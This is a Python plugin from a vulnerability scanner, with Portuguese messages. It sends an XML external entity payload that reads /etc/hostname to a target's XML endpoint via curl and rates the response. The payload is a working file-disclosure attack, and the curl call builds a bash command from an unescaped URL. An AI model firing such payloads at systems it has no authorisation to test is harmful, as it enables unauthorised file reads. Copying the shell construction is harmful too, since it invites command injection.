# plugins/xxe_probe.py
from typing import Dict, Any
from utils import run_cmd, Timer

PLUGIN_CONFIG_NAME = "xxe_probe"
PLUGIN_CONFIG_ALIASES = ["xxe"]
UUID_052 = "uuid-052"  # (52)

XML_PAYLOAD = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/hostname" >]>
<foo>&xxe;</foo>"""

def run_plugin(target: str, ai_fn, cfg: Dict[str,Any]=None):
    """
    cfg: { "enabled": false, "timeout": 12, "endpoint": "/api/xml" }
    """
    cfg = cfg or {}
    if not bool(cfg.get("enabled", False)):
        txt = "Desabilitado (defina enabled=true e endpoint XML controlado)."
        return {"plugin":"XXEProbe","result":[{"plugin_uuid":UUID_052,"scan_item_uuid":UUID_052,"result":txt,"analysis_ai":ai_fn("XXEProbe",UUID_052,txt),"severity":"info","duration":0.0,"auto":True}]}

    timeout = int(cfg.get("timeout", 12))
    url = target.rstrip("/") + cfg.get("endpoint","/api/xml")

    with Timer() as t:
        raw = run_cmd(["bash","-lc", f'curl -sS -m {timeout} -H "Content-Type: application/xml" --data-binary @- "{url}" <<EOF\n{XML_PAYLOAD}\nEOF'], timeout=timeout+2)
    sev = "medium" if ("root" in raw or len(raw.strip())>0) else "info"
    item = {"plugin_uuid":UUID_052,"scan_item_uuid":UUID_052,"result":raw[:300] or "Sem eco do parser XML","analysis_ai":ai_fn("XXEProbe",UUID_052,raw[:300]),"severity":sev,"duration":t.duration,"auto":True}
    return {"plugin":"XXEProbe","result":[item]}
